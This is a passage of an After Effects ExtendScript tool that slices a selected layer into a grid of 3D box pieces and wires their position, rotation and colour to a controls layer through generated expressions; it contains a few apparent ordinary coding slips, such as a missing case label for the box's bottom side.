                if (N == parseInt(Nums[i])) {
                  C++;
                }
              }
              if (C == 0) {
                break;
              } else {
                N++;
                C = 0;
              }
            }
            Num_SB = N;
            compsFolder_SB = app.project.items.addFolder(
              "Sliced Box_" + Num_SB,
            );
            compsFolder_SB.parentFolder = app.project.rootFolder;
            PiecesFolder_SB = app.project.items.addFolder("Pieces");
            PiecesFolder_SB.parentFolder = compsFolder_SB;
          }
          function _Precomposing() {
            ControlsLayerName = "MainBoxControls_SlicedBox_" + Num_SB;
            var pixelAspect = mainComp.pixelAspect;
            CompName = mainComp.name;
            var W = mainComp.width;
            var H = mainComp.height;
            var T_reset = true;
            var solid = false;
            selectedLayer.enabled = true;
            if (SBColumns == 1) {
              SlicedBoxEffectName = "Pseudo/Sliced_BoxCV3";
            } else if (SBRows == 1) {
              SlicedBoxEffectName = "Pseudo/Sliced_BoxRV3";
            } else {
              SlicedBoxEffectName = "Pseudo/Sliced_BoxV3";
            }
            if (!(selectedLayer instanceof TextLayer)) {
              if (selectedLayer.source.mainSource instanceof SolidSource) {
                solid = true;
              }
            }
            if (selectedLayer instanceof TextLayer) {
              if (_textBounds() === false) {
                progBar.close();
              }
              T_reset = null;
            }
            if (mainComp.layer(layerIndex).threeDLayer != false) {
              mainComp.layer(layerIndex).threeDLayer = false;
            }
            if (T_reset != null && numLayers === 1) {
              var xCenter = selectedLayer.width / 2;
              var yCenter = selectedLayer.height / 2;
              selectedLayer.startTime = 0;
              var LyrPosition = selectedLayer.transform.position;
              var lyrAp = selectedLayer.transform.anchorPoint;
              var lyrScale = selectedLayer.transform.scale;
              var lyrOrn = selectedLayer.transform.Rotation;
              if (lyrAp.numKeys != 0) {
                removeKeyframes(lyrAp);
              }
              if (lyrScale.numKeys != 0) {
                removeKeyframes(lyrScale);
              }
              if (lyrOrn.numKeys != 0) {
                removeKeyframes(lyrOrn);
              }
              if (LyrPosition.dimensionsSeparated === false) {
                removeKeyframes(LyrPosition);
                LyrPosition.setValue([W / 2, H / 2]);
              } else {
                LyrPosition.dimensionsSeparated = false;
                removeKeyframes(LyrPosition);
                LyrPosition.setValue([W / 2, H / 2]);
              }
              lyrAp.setValue([xCenter, yCenter]);
              lyrOrn.setValue(0);
              lyrScale.setValue([100, 100, 100]);
            }
            PlaceholderComp = mainComp.layers.precompose(
              [layerIndex],
              "__Placeholder_SlicedBox",
              false,
            );
            mainComp.layer(layerIndex).label = 9;
            PlaceholderComp.label = 9;
            PlaceholderComp.parentFolder = compsFolder_SB;
            if (solid === true) {
              PlaceholderComp.layer(1).Effects.addProperty("ADBE Fill");
            }
            GridLayer = PlaceholderComp.layers.addSolid(
              [0, 0, 0],
              "Grid",
              PlaceholderComp.width,
              PlaceholderComp.height,
              pixelAspect,
            );
            GridFX = GridLayer.Effects.addProperty("ADBE Grid");
            GridLayer.guideLayer = true;
            GridFX(1).setValue([-2, -2]);
            GridFX(2).setValue(1);
            GridFX(3).setValue([
              PlaceholderComp.width / SBColumns,
              PlaceholderComp.height / SBRows,
            ]);
            GridFX(6).setValue(4);
            GridFX(12).setValue([0, 0, 0]);
          }
          function _textBounds() {
            var pixelAspect = mainComp.pixelAspect;
            CropText_CHBX = Tab1.CropText.value;
            if (CropText_CHBX === true) {
              var txtScale = selectedLayer.scale;
              removeKeyframes(txtScale);
              txtScale.setValue([100, 100]);
              var ss = app.project.activeItem.selectedProperties;
              for (var k = 0; k < ss.length; k += 1) {
                ss[k].selected = false;
              }
              var TextProp = selectedLayer
                .property("ADBE Text Properties")
                .property("ADBE Text Document");
              TextProp.selected = true;
              app.executeCommand(2240);
              app.executeCommand(19);
              var textDocument = TextProp.value;
              JRetuen = TextProp.value.justification;
              if (JRetuen === ParagraphJustification.LEFT_JUSTIFY) {
                textDocument.justification =
                  ParagraphJustification.CENTER_JUSTIFY;
                TextProp.setValue(textDocument);
                DS = 1;
              } else if (JRetuen === ParagraphJustification.RIGHT_JUSTIFY) {
                textDocument.justification =
                  ParagraphJustification.CENTER_JUSTIFY;
                TextProp.setValue(textDocument);
                DS = -1;
              } else {
                DS = 0;
              }
              if (textDocument != 0) {
                myString = selectedLayer.sourceText.value.text;
                lines = myString.split("\r").length;
                var boundsObject = selectedLayer.sourceRectAtTime(0, false);
                textLength = Math.abs(boundsObject.left);
                textHeight = Math.abs(boundsObject.top);
                px =
                  (textLength / 2) * (selectedLayer.scale.value[0] / 100) + 25;
                py =
                  (textHeight / 2) * (selectedLayer.scale.value[1] / 100) + 25;
                padding = 0.5;
                W = Math.round(textLength * 2 + textLength * padding);
                H = lines * Math.round(textHeight * 1.2 + textHeight * padding);
                var tempx =
                  selectedLayer.sourceRectAtTime(0, false).width / 2 +
                  selectedLayer.sourceRectAtTime(0, false).left;
                var tempy =
                  selectedLayer.sourceRectAtTime(0, false).height / 2 +
                  selectedLayer.sourceRectAtTime(0, false).top;
                var solid = mainComp.layers.addSolid(
                  [0.35294100642204, 0, 1],
                  "Text bounds",
                  W,
                  H,
                  pixelAspect,
                );
                mainComp.layer(1).moveAfter(mainComp.layer(layerIndex + 1));
                YourTextComp = mainComp.layers.precompose(
                  [layerIndex + 1],
                  "Your Text",
                  false,
                );
                YourTextComp.label = 9;
                YourTextComp.parentFolder = compsFolder_SB;
                layerCopy = selectedLayer.duplicate();
                textLayerCopyProp = layerCopy
                  .property("ADBE Text Properties")
                  .property("ADBE Text Document");
                textDocument2 = textLayerCopyProp.value;
                textDocument2.justification = JRetuen;
                textLayerCopyProp.setValue(textDocument2);
                textLayerCopyProp.selected = true;
                app.executeCommand(2240);
                app.executeCommand(20);
                selectedLayer.remove();
                layerCopy.copyToComp(YourTextComp);
                YourTextComp.layer(2).Effects.addProperty("ADBE Fill");
                mainComp.layer(layerIndex).remove();
                var txtAnch = YourTextComp.layer(1).anchorPoint;
                removeKeyframes(txtAnch);
                txtAnch.setValue([tempx, tempy]);
                var txtPos = YourTextComp.layer(1).position;
                if (txtPos.dimensionsSeparated === false) {
                  removeKeyframes(txtPos);
                  txtPos.setValue([W / 2 - DS * textLength, H / 2]);
                } else {
                  txtPos.dimensionsSeparated = false;
                  removeKeyframes(txtPos);
                  txtPos.setValue([W / 2 - DS * textLength, H / 2]);
                }
                return true;
              } else {
                alert("Text Layer is Empty!", alertTitle);
                compsFolder_SB.remove();
                return false;
              }
            } else {
              var solid = mainComp.layers.addSolid(
                [0.35294100642204, 0, 1],
                "BG",
                mainComp.width,
                mainComp.height,
                pixelAspect,
              );
              mainComp.layer(1).moveAfter(mainComp.layer(layerIndex + 1));
              YourTextComp = mainComp.layers.precompose(
                [layerIndex + 1],
                "Your Text",
                false,
              );
              YourTextComp.label = 9;
              YourTextComp.parentFolder = compsFolder_SB;
              selectedLayer.copyToComp(YourTextComp);
              YourTextComp.layer(2).Effects.addProperty("ADBE Fill");
              mainComp.layer(layerIndex).remove();
              return true;
            }
          }
          function _Slicer() {
            MB_Checkbox = myPal.grp.TabbedPanel.Tab2.EnableMotionBlur.value;
            CastsShadows_CHBX = myPal.grp.TabbedPanel.Tab2.CastsShadows.value;
            AcceptsShadows_CHBX =
              myPal.grp.TabbedPanel.Tab2.AcceptsShadows.value;
            AcceptsLights_CHBX = myPal.grp.TabbedPanel.Tab2.AcceptsLights.value;
            var targetLayer = mainComp.selectedLayers[0];
            var CreateNewLayers = [];
            var CreateNewComps = [];
            var counter = 0;
            var HCompW = mainComp.width / 2;
            var HCompH = mainComp.height / 2;
            var PieceWidth = Math.round(targetLayer.width / SBColumns);
            var PieceHeight = Math.round(targetLayer.height / SBRows);
            var xCenter = targetLayer.width / 2;
            var yCenter = targetLayer.height / 2;
            var PieceWidthCenter = PieceWidth / 2;
            var PieceHeightCenter = PieceHeight / 2;
            for (var k = 0; k < SBRows; k += 1) {
              for (var j = 0; j < SBColumns; j += 1) {
                CreateNewLayers[counter] = targetLayer.duplicate();
                CreateNewComps[counter] = mainComp.layers.precompose(
                  [CreateNewLayers[counter].index],
                  "Piece" + counter + 1 + "_SS_SlicedBox",
                  true,
                );
                CreateNewComps[counter].parentFolder = PiecesFolder_SB;
                CreateNewComps[counter].width = PieceWidth;
                CreateNewComps[counter].height = PieceHeight;
                CreateNewComps[counter]
                  .layer(1)
                  .position.setValue([
                    xCenter - j * PieceWidth,
                    yCenter - k * PieceHeight,
                  ]);
                mainComp
                  .layer(counter + layerIndex)
                  .position.setValue([
                    HCompW - xCenter + PieceWidthCenter + j * PieceWidth,
                    HCompH - yCenter + PieceHeightCenter + k * PieceHeight,
                  ]);
                counter = counter + 1;
              }
            }
            for (var l = 0; l < counter + 1; l += 1) {
              mainComp.layer(l + layerIndex).threeDLayer = true;
            }
            targetLayer.opacity.setValue([0]);
            var PCN = SBColumns * SBRows + layerIndex;
            for (var i = layerIndex; i <= PCN; i++) {
              if (MB_Checkbox == true) {
                mainComp.layer(i).motionBlur = true;
              }
              if (CastsShadows_CHBX == true) {
                mainComp
                  .layer(i)
                  .property("ADBE Material Options Group")
                  .property("ADBE Casts Shadows")
                  .setValue(true);
              } else {
                mainComp
                  .layer(i)
                  .property("ADBE Material Options Group")
                  .property("ADBE Casts Shadows")
                  .setValue(false);
              }
              if (AcceptsShadows_CHBX == true) {
                mainComp
                  .layer(i)
                  .property("ADBE Material Options Group")
                  .property("ADBE Accepts Shadows")
                  .setValue(true);
              } else {
                mainComp
                  .layer(i)
                  .property("ADBE Material Options Group")
                  .property("ADBE Accepts Shadows")
                  .setValue(false);
              }
              if (AcceptsLights_CHBX == true) {
                mainComp
                  .layer(i)
                  .property("ADBE Material Options Group")
                  .property("ADBE Accepts Lights")
                  .setValue(true);
              } else {
                mainComp
                  .layer(i)
                  .property("ADBE Material Options Group")
                  .property("ADBE Accepts Lights")
                  .setValue(false);
              }
            }
          }
          function _createBoxes() {
            var PiecesCount = SBColumns * SBRows;
            var pixelAspect = mainComp.pixelAspect;
            var pA = pixelAspect - 1;
            var layerIndex = mainComp.selectedLayers[0].index;
            var LS = layerIndex - PiecesCount + 1;
            SI = LS;
            var pieceWidth = Math.round(
              mainComp.layer(SBRows * SBColumns + SI).width / SBColumns,
            );
            var pieceHeight = Math.round(
              mainComp.layer(SBRows * SBColumns + SI).height / SBRows,
            );
            var CompW = mainComp.width / 2;
            var CompH = mainComp.height / 2;
            var PiecesCount = SBColumns * SBRows;
            lyrWidth = mainComp.layer(SBRows * SBColumns + SI).width;
            lyrHeight = mainComp.layer(SBRows * SBColumns + SI).height;
            var BD = parseInt(BoxWidthSB);
            for (var i = 1; i <= 6; i += 1) {
              switch (i) {
                case 1:
                  side_name = "front";
                  W = pieceWidth;
                  H = pieceHeight;
                  break;
                case 2:
                  side_name = "right";
                  W = BD;
                  H = pieceHeight;
                  break;
                case 3:
                  side_name = "left";
                  W = BD;
                  H = pieceHeight;
                  break;
                case 4:
                  side_name = "back";
                  W = pieceWidth;
                  H = pieceHeight;
                  break;
                case 5:
                  side_name = "top";
                  W = BD;
                  H = Math.round(pieceWidth + pieceWidth * pA);
                  break;
                  side_name = "bottom";
                  W = BD;
                  H = Math.round(pieceWidth + pieceWidth * pA);
                  break;
              }
              BoxSolid = mainComp.layers.addSolid(
                [0, 0.19, 0.69],
                side_name,
                W,
                H,
                pixelAspect,
              );
              BoxSolid.threeDLayer = true;
              RProperty = BoxSolid.transform.orientation;
              switch (i) {
                case 1:
                  RProperty.setValue([0, 0, 0]);
                  break;
                case 2:
                  RProperty.setValue([0, 270, 0]);
                  break;
                case 3:
                  RProperty.setValue([0, 90, 0]);
                  break;
                case 4:
                  RProperty.setValue([180, 0, 0]);
                  break;
                case 5:
                  RProperty.setValue([270, 0, 90]);
                  break;
                case 6:
                  RProperty.setValue([90, 0, 90]);
                  break;
                default:
              }
              PProperty = BoxSolid.transform.position;
              ZO = Math.round(0.5 * BD * pA + 0.5 * BD);
              ZOB = Math.round(BD * pA + BD);
              switch (i) {
                case 1:
                  PProperty.setValue([CompW, CompH, 0]);
                  break;
                case 2:
                  PProperty.setValue([CompW + 0.5 * pieceWidth, CompH, ZO]);
                  break;
                case 3:
                  PProperty.setValue([CompW - 0.5 * pieceWidth, CompH, ZO]);
                  break;
                case 4:
                  PProperty.setValue([CompW, CompH, ZOB]);
                  break;
                case 5:
                  PProperty.setValue([CompW, CompH - 0.5 * pieceHeight, ZO]);
                  break;
                case 6:
                  PProperty.setValue([CompW, CompH + 0.5 * pieceHeight, ZO]);
                  break;
                default:
              }
            }
            mainComp.layer(6).Opacity.setValue(0);
            var ControlsLayer = mainComp.layers.addNull();
            ControlsLayer.label = 2;
            ControlsLayer.source.name = ControlsLayerName;
            app.beginSuppressDialogs();
            if (SBColumns == 1) {
              SlicedBoxEffect = applyPseudoEffect(SBCAPFile, ControlsLayer);
              SlicedBoxEffect.name = "Sliced Box";
              BandCP = 52;
              TBrP = 54;
              TConP = 55;
              LBrP = 58;
              LConP = 59;
              RBrP = 62;
              RConP = 63;
              BaBrP = 66;
              BaConP = 67;
              BoBrP = 70;
              BoConP = 71;
            } else if (SBRows == 1) {
              SlicedBoxEffect = applyPseudoEffect(SBRAPFile, ControlsLayer);
              SlicedBoxEffect.name = "Sliced Box";
              BandCP = 52;
              TBrP = 54;
              TConP = 55;
              LBrP = 58;
              LConP = 59;
              RBrP = 62;
              RConP = 63;
              BaBrP = 66;
              BaConP = 67;
              BoBrP = 70;
              BoConP = 71;
            } else {
              SlicedBoxEffect = applyPseudoEffect(SBAPFile, ControlsLayer);
              BandCP = 49;
              TBrP = 51;
              TConP = 52;
              LBrP = 55;
              LConP = 56;
              RBrP = 59;
              RConP = 60;
              BaBrP = 63;
              BaConP = 64;
              BoBrP = 67;
              BoConP = 68;
            }
            app.endSuppressDialogs(false);
            try {
              if (YourTextComp.layer(1) instanceof TextLayer) {
                SlicedBoxEffect("Color").setValue([0.35294100642204, 0, 1]);
              }
            } catch (e) {}
            if (LayerColor !== null) {
              SlicedBoxEffect("Color").setValue(LayerColor);
            }
            SlicedBoxEffect(RBrP).setValue(-25);
            SlicedBoxEffect(RBrP).expression =
              'CHKB=effect("' +
              SlicedBoxEffectName +
              '")(' +
              BandCP +
              ");" +
              "if (CHKB==true){value}else{0};";
            SlicedBoxEffect(RConP).setValue(20);
            SlicedBoxEffect(RConP).expression =
              'CHKB=effect("' +
              SlicedBoxEffectName +
              '")(' +
              BandCP +
              ");" +
              "if (CHKB==true){value}else{0};";
            SlicedBoxEffect(LBrP).setValue(-20);
            SlicedBoxEffect(LBrP).expression =
              'CHKB=effect("' +
              SlicedBoxEffectName +
              '")(' +
              BandCP +
              ");" +
              "if (CHKB==true){value}else{0};";
            SlicedBoxEffect(LConP).setValue(0);
            SlicedBoxEffect(LConP).expression =
              'CHKB=effect("' +
              SlicedBoxEffectName +
              '")(' +
              BandCP +
              ");" +
              "if (CHKB==true){value}else{0};";
            SlicedBoxEffect(TBrP).setValue(5);
            SlicedBoxEffect(TBrP).expression =
              'CHKB=effect("' +
              SlicedBoxEffectName +
              '")(' +
              BandCP +
              ");" +
              "if (CHKB==true){value}else{0};";
            SlicedBoxEffect(TConP).setValue(0);
            SlicedBoxEffect(TConP).expression =
              'CHKB=effect("' +
              SlicedBoxEffectName +
              '")(' +
              BandCP +
              ");" +
              "if (CHKB==true){value}else{0};";
            SlicedBoxEffect(BoBrP).setValue(-30);
            SlicedBoxEffect(BoBrP).expression =
              'CHKB=effect("' +
              SlicedBoxEffectName +
              '")(' +
              BandCP +
              ");" +
              "if (CHKB==true){value}else{0};";
            SlicedBoxEffect(BoConP).setValue(20);
            SlicedBoxEffect(BoConP).expression =
              'CHKB=effect("' +
              SlicedBoxEffectName +
              '")(' +
              BandCP +
              ");" +
              "if (CHKB==true){value}else{0};";
            SlicedBoxEffect(BaBrP).setValue(-10);
            SlicedBoxEffect(BaBrP).expression =
              'CHKB=effect("' +
              SlicedBoxEffectName +
              '")(' +
              BandCP +
              ");" +
              "if (CHKB==true){value}else{0};";
            SlicedBoxEffect(BaConP).setValue(-20);
            SlicedBoxEffect(BaConP).expression =
              'CHKB=effect("' +
              SlicedBoxEffectName +
              '")(' +
              BandCP +
              ");" +
              "if (CHKB==true){value}else{0};";
            SlicedBoxEffect("Offset").setValue(20);
            SlicedBoxEffect(BandCP).setValue(1);
            for (var k = 2; k <= 6; k += 1) {
              FillEffect = mainComp.layer(k).Effects.addProperty("ADBE Fill");
              FillEffectName = FillEffect.name;
              FillEffect(3).expression =
                'comp("' +
                CompName +
                '").layer("' +
                ControlsLayerName +
                '").effect("' +
                SlicedBoxEffectName +
                '")("Color")';
              mainComp.layer(k).transform.opacity.expression =
                'comp("' +
                CompName +
                '").layer("' +
                ControlsLayerName +
                '").effect("' +
                SlicedBoxEffectName +
                '")("Boxes Opacity")';
              if (MB_Checkbox == true) {
                mainComp.layer(k).motionBlur = true;
              }
              if (CastsShadows_CHBX == true) {
                mainComp
                  .layer(k)
                  .property("ADBE Material Options Group")
                  .property("ADBE Casts Shadows")
                  .setValue(true);
              } else {
                mainComp
                  .layer(k)
                  .property("ADBE Material Options Group")
                  .property("ADBE Casts Shadows")
                  .setValue(false);
              }
              if (AcceptsShadows_CHBX == true) {
                mainComp
                  .layer(k)
                  .property("ADBE Material Options Group")
                  .property("ADBE Accepts Shadows")
                  .setValue(true);
              } else {
                mainComp
                  .layer(k)
                  .property("ADBE Material Options Group")
                  .property("ADBE Accepts Shadows")
                  .setValue(false);
              }
              if (AcceptsLights_CHBX == true) {
                mainComp
                  .layer(k)
                  .property("ADBE Material Options Group")
                  .property("ADBE Accepts Lights")
                  .setValue(true);
              } else {
                mainComp
                  .layer(k)
                  .property("ADBE Material Options Group")
                  .property("ADBE Accepts Lights")
                  .setValue(false);
              }
            }
            for (var i = 1; i <= 5; i += 1) {
              BC2effect = mainComp
                .layer(i + 1)
                .Effects.addProperty("ADBE Brightness & Contrast");
              BC2Name = BC2effect.name;
              switch (i) {
                case 5:
                  BC2effect(1).expression =
                    'comp("' +
                    CompName +
                    '").layer("' +
                    ControlsLayerName +
                    '").effect("' +
                    SlicedBoxEffectName +
                    '")(' +
                    RBrP +
                    ")";
                  BC2effect(2).expression =
                    'comp("' +
                    CompName +
                    '").layer("' +
                    ControlsLayerName +
                    '").effect("' +
                    SlicedBoxEffectName +
                    '")(' +
                    RConP +
                    ")";
                  break;
                case 4:
                  BC2effect(1).expression =
                    'comp("' +
                    CompName +
                    '").layer("' +
                    ControlsLayerName +
                    '").effect("' +
                    SlicedBoxEffectName +
                    '")(' +
                    LBrP +
                    ")";
                  BC2effect(2).expression =
                    'comp("' +
                    CompName +
                    '").layer("' +
                    ControlsLayerName +
                    '").effect("' +
                    SlicedBoxEffectName +
                    '")(' +
                    LConP +
                    ")";
                  break;
                case 3:
                  BC2effect(1).expression =
                    'comp("' +
                    CompName +
                    '").layer("' +
                    ControlsLayerName +
                    '").effect("' +
                    SlicedBoxEffectName +
                    '")(' +
                    BaBrP +
                    ")";
                  BC2effect(2).expression =
                    'comp("' +
                    CompName +
                    '").layer("' +
                    ControlsLayerName +
                    '").effect("' +
                    SlicedBoxEffectName +
                    '")(' +
                    BaConP +
                    ")";
                  break;
                case 2:
                  BC2effect(1).expression =
                    'comp("' +
                    CompName +
                    '").layer("' +
                    ControlsLayerName +
                    '").effect("' +
                    SlicedBoxEffectName +
                    '")(' +
                    TBrP +
                    ")";
                  BC2effect(2).expression =
                    'comp("' +
                    CompName +
                    '").layer("' +
                    ControlsLayerName +
                    '").effect("' +
                    SlicedBoxEffectName +
                    '")(' +
                    TConP +
                    ")";
                  break;
                case 1:
                  BC2effect(1).expression =
                    'comp("' +
                    CompName +
                    '").layer("' +
                    ControlsLayerName +
                    '").effect("' +
                    SlicedBoxEffectName +
                    '")(' +
                    BoBrP +
                    ")";
                  BC2effect(2).expression =
                    'comp("' +
                    CompName +
                    '").layer("' +
                    ControlsLayerName +
                    '").effect("' +
                    SlicedBoxEffectName +
                    '")(' +
                    BoConP +
                    ")";
                  break;
                default:
              }
            }
            mainComp
              .layer(1)
              .moveAfter(
                mainComp.layer(mainComp.layer(2 + PiecesCount + SI + 5).index),
              );
            mainComp.layer(2 + PiecesCount + SI + 5).selected = false;
            for (var k = 1; k <= 6; k += 1) {
              mainComp.layer(k).selected = true;
            }
            var indexes = [];
            for (var i = 0; i < mainComp.selectedLayers.length; i += 1) {
              indexes.push(mainComp.selectedLayers[i].index);
            }
            BoxPiece = mainComp.layers.precompose(indexes, "BoxPiece", true);
            BoxPiece.width = pieceWidth;
            BoxPiece.height = pieceHeight;
            BoxPiece.parentFolder = compsFolder_SB;
            mainComp.layers[1].collapseTransformation = true;
            mainComp.layers[1].threeDLayer = true;
            mainComp.layers[1].label = 12;
            for (var i = 1; i < BoxPiece.numLayers; i += 1) {
              BoxPiece.layer(i).parent = BoxPiece.layer(6);
            }
            BoxPiece.layer(6).transform.position.setValue([
              pieceWidth / 2,
              pieceHeight / 2,
              0,
            ]);
            var PiecesCount = SBColumns * SBRows;
            sPos = mainComp.layer(PiecesCount + SI).transform.position.value;
            mainComp
              .layer(1)
              .transform.position.setValue([sPos[0], sPos[1], 0]);
            for (var i = 1; i < 2 * PiecesCount - 2; i += 1) {
              mainComp.layers[1].duplicate();
              sPos = mainComp.layer(PiecesCount + SI).transform.position.value;
              mainComp
                .layer(1)
                .transform.position.setValue([sPos[0], sPos[1], 0]);
              i = i + 1;
            }
            mainComp.layer(PiecesCount).selected = false;
            mainComp.layer(2 * PiecesCount + SI + 1).selected = true;
            for (var k = 1; k <= PiecesCount; k += 1) {
              mainComp.layer(k).selected = true;
            }
            for (var i = 1; i < mainComp.selectedLayers.length; i += 1) {
              mainComp.selectedLayers[i].moveAfter(
                mainComp.layer(
                  mainComp.selectedLayers[i].index + PiecesCount * 2 + SI - 2,
                ),
              );
            }
            for (var i = 1; i <= PiecesCount; i += 1) {
              X = PiecesCount + i + SI - 1;
              mainComp.layer(X).parent = mainComp.layers[i + SI - 1];
            }
          }
          function _setPositionExpressions() {
            var PiecesCount = SBColumns * SBRows;
            var layerIndex = mainComp.selectedLayers[0].index;
            var layerIndex = layerIndex - 2 * PiecesCount - 1;
            SI = layerIndex;
            var CompW = mainComp.width / 2;
            var CompH = mainComp.height / 2;
            mainComp.layer(ControlsLayerName).moveBefore(mainComp.layer(1));
            for (var l = 1; l <= PiecesCount; l += 1) {
              mainComp.layer(l + SI).position.dimensionsSeparated = true;
            }
            mainComp.layer(ControlsLayerName).effect(SlicedBoxEffectName)(
              "Anchor Point [Z]",
            ).expression =
              'ZS=effect("' +
              SlicedBoxEffectName +
              '")("Extrusion");' +
              'CAP=effect("' +
              SlicedBoxEffectName +
              '")("Center Anchor Point [Z]");' +
              "\nCenter=(" +
              BoxWidthSB / 2 +
              ")+((ZS/100)-1)*" +
              BoxWidthSB / 2 +
              ";" +
              "\nif (CAP==true){Center}else{value};";
            for (var l = 1; l <= PiecesCount; l += 1) {
              var S = mainComp.layer(l + SI);
              var Index = S.Effects.addProperty("ADBE Slider Control");
              Index.name = "ID";
              S.effect("ID")(1).setValue(l);
              mainComp.layer(l + SI).xRotation.expression =
                'ID =effect("ID")(1);\n\r XR = comp("' +
                CompName +
                '").layer("' +
                ControlsLayerName +
                '").effect("' +
                SlicedBoxEffectName +
                '")("Rotation X"); ' +
                '\n\r X = XR + (comp("' +
                CompName +
                '").layer("' +
                ControlsLayerName +
                '").effect("' +
                SlicedBoxEffectName +
                '")("Offset X") *( ID));';
              mainComp.layer(l + SI).yRotation.expression =
                'ID =effect("ID")(1);\n\r YR = comp("' +
                CompName +
                '").layer("' +
                ControlsLayerName +
                '").effect("' +
                SlicedBoxEffectName +
                '")("Rotation Y"); ' +
                '\n\r Y = YR + (comp("' +
                CompName +
                '").layer("' +
                ControlsLayerName +
                '").effect("' +
                SlicedBoxEffectName +
                '")("Offset Y") *( ID));';
              mainComp.layer(l + SI).zRotation.expression =
                'ID =effect("ID")(1);\n\r ZR = comp("' +
                CompName +
                '").layer("' +
                ControlsLayerName +
                '").effect("' +
                SlicedBoxEffectName +
                '")("Rotation Z"); ' +
                '\n\r Z = ZR + (comp("' +
                CompName +
                '").layer("' +
                ControlsLayerName +
                '").effect("' +
                SlicedBoxEffectName +
                '")("Offset Z") *( ID));';
              mainComp.layer(l + SI).transform.anchorPoint.expression =
                'temp =comp("' +
                CompName +
                '").layer("' +
                ControlsLayerName +
                '").effect("' +
                SlicedBoxEffectName +
                '")("Anchor Point [Z]");' +
                "\n [value[0], value[1], temp]";
            }
            var counter = 1;
            for (var k = 1; k <= SBRows; k += 1) {
              for (var j = 1; j <= SBColumns; j += 1) {
                columnID = mainComp
                  .layer(counter + SI)
                  .Effects.addProperty("ADBE Slider Control");
                columnID.name = "Column ID";
                mainComp
                  .layer(counter + SI)
                  .effect("Column ID")(1)
                  .setValue([j]);
                rowID = mainComp
                  .layer(counter + SI)
                  .Effects.addProperty("ADBE Slider Control");
                rowID.name = "Row ID";
                mainComp
                  .layer(counter + SI)
                  .effect("Row ID")(1)
                  .setValue([k]);
                if (SBColumns % 2 == 0) {
                  mainComp.layer(counter + SI).transform.xPosition.expression =
                    'CI= effect("Column ID")(1);\nXO=comp("' +
                    CompName +
                    '").layer("' +
                    ControlsLayerName +
                    '").effect("' +
                    SlicedBoxEffectName +
                    '")("X Displace");' +
                    "\nColumns= " +
                    SBColumns +
                    ";" +
                    "\nMiddle=Columns/2;" +
                    "\nif (CI<= Middle){" +
                    "\n[value-(Middle+1-CI)*XO]" +
                    "\n}else if (CI > Middle){" +
                    "\n[value+(CI-Middle)*XO]}";
                } else if (SBColumns == 1) {
                  mainComp.layer(counter + SI).transform.xPosition.expression =
                    'ID = effect("ID")(1);\nRI= effect("Row ID")(1);\nXO=comp("' +
                    CompName +
                    '").layer("' +
                    ControlsLayerName +
                    '").effect("' +
                    SlicedBoxEffectName +
                    '")("X Displace");' +
                    '\nCHK=comp("' +
                    CompName +
                    '").layer("' +
                    ControlsLayerName +
                    '").effect("' +
                    SlicedBoxEffectName +
                    '")(' +
                    10 +
                    ");" +
                    '\nR = comp("' +
                    CompName +
                    '").layer("' +
                    ControlsLayerName +
                    '").effect("' +
                    SlicedBoxEffectName +
                    '")("Random Seed");' +
                    "\nif (CHK == true) {" +
                    "\nseedRandom(R+ID)" +
                    "\nvalue+[wiggle(0,(2*XO))]-" +
                    lyrWidth / 2 +
                    "" +
                    "\n}else if (RI%2 == 0){" +
                    "\nvalue-XO" +
                    "\n}else if (RI%2 != 0){" +
                    "\nvalue+XO}";
                } else {
                  mainComp.layer(counter + SI).transform.xPosition.expression =
                    'CI= effect("Column ID")(1);\nXO=comp("' +
                    CompName +
                    '").layer("' +
                    ControlsLayerName +
                    '").effect("' +
                    SlicedBoxEffectName +
                    '")("X Displace");' +
                    "\nColumns= " +
                    SBColumns +
                    ";" +
                    "\nMiddle=(Columns/2)+.5;" +
                    "\nif (CI< Middle){" +
                    "\n[value-(Middle-CI)*XO]" +
                    "\n}else if (CI > Middle){" +
                    "\n[value+(CI-Middle)*XO]" +
                    "\n}else{value}";
                }
                if (SBRows % 2 == 0) {
                  mainComp.layer(counter + SI).transform.yPosition.expression =
                    'RI= effect("Row ID")(1);\nYO=comp("' +
                    CompName +
                    '").layer("' +
                    ControlsLayerName +
                    '").effect("' +
                    SlicedBoxEffectName +
                    '")("Y Displace");' +
                    "\nRows= " +
                    SBRows +
                    ";" +
                    "\nMiddle=Rows/2;" +
                    "\nif (RI<= Middle){" +
                    "\n[value-(Middle+1-RI)*YO]" +
                    "\n}else if (RI > Middle){" +
                    "\n[value+(RI-Middle)*YO]}";
                } else if (SBRows == 1) {
                  mainComp.layer(counter + SI).transform.yPosition.expression =
                    'ID = effect("ID")(1);\nCI= effect("Column ID")(1);\nYO=comp("' +
                    CompName +
                    '").layer("' +
                    ControlsLayerName +
                    '").effect("' +
                    SlicedBoxEffectName +
                    '")("Y Displace");' +
                    '\nCHK=comp("' +
                    CompName +
                    '").layer("' +
                    ControlsLayerName +
                    '").effect("' +
                    SlicedBoxEffectName +
                    '")(' +
                    10 +
                    ");" +
                    '\nR = comp("' +
                    CompName +
                    '").layer("' +
                    ControlsLayerName +
                    '").effect("' +
                    SlicedBoxEffectName +
                    '")("Random Seed");' +
                    "\nif (CHK == true) {" +
                    "\nseedRandom(R+ID)" +
                    "\nvalue+[wiggle(0,(2*YO))]-" +
                    lyrHeight / 2 +
                    "" +
                    "\n}else if (CI%2 == 0){" +
                    "\nvalue-YO" +
                    "\n}else if (CI%2 != 0){" +
                    "\nvalue+YO}";
                } else {
                  mainComp.layer(counter + SI).transform.yPosition.expression =
                    'RI= effect("Row ID")(1);\nYO=comp("' +
                    CompName +
                    '").layer("' +
                    ControlsLayerName +
                    '").effect("' +
                    SlicedBoxEffectName +
                    '")("Y Displace");' +
                    "\nRows= " +
                    SBRows +
                    ";" +
                    "\nMiddle=(Rows/2)+.5;" +
                    "\nif (RI< Middle){" +
                    "\n[value-(Middle-RI)*YO]" +
                    "\n}else if (RI > Middle){" +
                    "\n[value+(RI-Middle)*YO]" +
                    "\n}else{value}";
                }
                counter = counter + 1;
              }
            }
            for (var i = 1; i <= PiecesCount; i += 1) {
              mainComp.layer(i + SI).transform.zPosition.expression =
                'ID = effect("ID")(1);\nRI= effect("Row ID")(1);\nCI= effect("Column ID")(1);\nZO=comp("' +
                CompName +
                '").layer("' +
                ControlsLayerName +
                '").effect("' +
                SlicedBoxEffectName +
                '")("Z Displace");' +
                '\nCHK=comp("' +
                CompName +
                '").layer("' +
                ControlsLayerName +
                '").effect("' +
                SlicedBoxEffectName +
                '")("Z");' +
                '\nR = comp("' +
                CompName +
                '").layer("' +
                ControlsLayerName +
                '").effect("' +
                SlicedBoxEffectName +
